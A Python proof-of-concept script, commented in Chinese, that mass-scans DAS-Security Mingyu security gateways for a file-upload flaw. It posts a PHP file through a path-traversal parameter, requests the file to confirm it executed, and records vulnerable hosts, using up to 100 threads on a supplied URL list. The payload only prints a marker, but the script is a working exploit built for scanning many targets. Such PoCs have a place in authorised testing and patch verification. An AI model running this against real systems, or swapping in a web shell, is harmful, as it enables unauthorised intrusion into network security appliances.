import sys
import requests
import argparse
import logging
from multiprocessing.dummy import Pool

# 禁用 urllib3 警告
requests.packages.urllib3.disable_warnings()

# 设置日志配置
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')


def banner():
    test = r"""
  _              _             
 (_)            (_)            
  ___      _____ _ _ __   __ _ 
 | \ \ /\ / / _ \ | '_ \ / _` |
 | |\ V  V /  __/ | | | | (_| |
 |_| \_/\_/ \___|_|_| |_|\__,_|


                            version:1.1.0
                            author:fangwei   
"""
    logging.info(test)


def main():
    banner()
    parser = argparse.ArgumentParser(description='安恒明御安全网关 文件上传')
    parser.add_argument('-u', '--url', dest='url', type=str, help='Please input link')
    parser.add_argument('-f', '--file', dest='file', type=str, help='File Path')
    args = parser.parse_args()

    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file, 'r', encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        with Pool(100) as mp:
            mp.map(poc, url_list)
    else:
        logging.error("Usage:\n\t python3 {} -h".format(sys.argv[0]))


def poc(target, boundary="--849978f98abe41119122148e4aa65b1a"):
    payload_url = '/webui/?g=aaa_local_web_preview&name=123&read=0&suffix=/../../../test.php'
    url = target + payload_url
    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) '
                      'Version/12.0.3 Safari/605.1.15',
        'Content-Type': f'multipart/form-data; boundary={boundary}',
        'Accept-Encoding': 'gzip',
    }
    # Multipart data is not handled correctly here
    data = {
        '123': ('test.php', '<?php print("This page has a vulnerability"); ?>', 'text/plain')
    }
    proxies = {
        'http': 'http://127.0.0.1:8080',
        'https': 'http://127.0.0.1:8080',
    }

    try:
        res = requests.post(url=url, headers=headers, files=data, timeout=5, verify=False)
        if "success" in res.text:
            payload = '/test.php'
            url1 = target + payload
            res1 = requests.get(url=url1, verify=False)
            if "This page has a vulnerability" in res1.text:
                logging.info(f"[+] 该网站存在文件上传漏洞, url为: {target}")
                with open("anhenre.txt", "a", encoding="utf-8") as fp:
                    fp.write(target + '\n')
        else:
            logging.info(f"[-] 该网站不存在文件上传漏洞, url为: {target}")

    except Exception as e:
        logging.error(f"[*] 该网站无法访问, url为: {target}, 错误信息: {e}")


if __name__ == '__main__':
    main()
